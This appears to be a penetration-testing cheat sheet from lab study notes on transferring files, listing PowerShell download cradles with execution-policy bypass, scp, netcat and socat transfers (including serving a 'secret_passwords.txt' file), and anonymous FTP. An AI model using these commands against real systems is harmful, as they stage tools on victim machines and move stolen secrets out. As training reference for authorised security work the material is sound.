### Using third-party file sharing links\
https://www.file.io/

### Powershell
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" 
powershell -nop -Exec Bypass -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

### SCP Copy file from remote machine to local tmp
scp john@localhost:/var/tmp/CopyMe.txt /tmp  
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2  
scp -P 2222 student@192.168.79.112:/usr/share/kali-defaults/web/img/password.png /home/kali/

### NC transfering files
```
nc -lvnp 6666 > incoming.txt
nc -nv 192.168.65.61 6666 < incoming.txt
```

### Socat transfer files
```
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

### FTP(permitted commands:ls,mkdir,put file, get file)
```
anonymous login: ftp ip; username:anonymous;password:blank; 
ascii mode: ascii
binary mode: bin
```
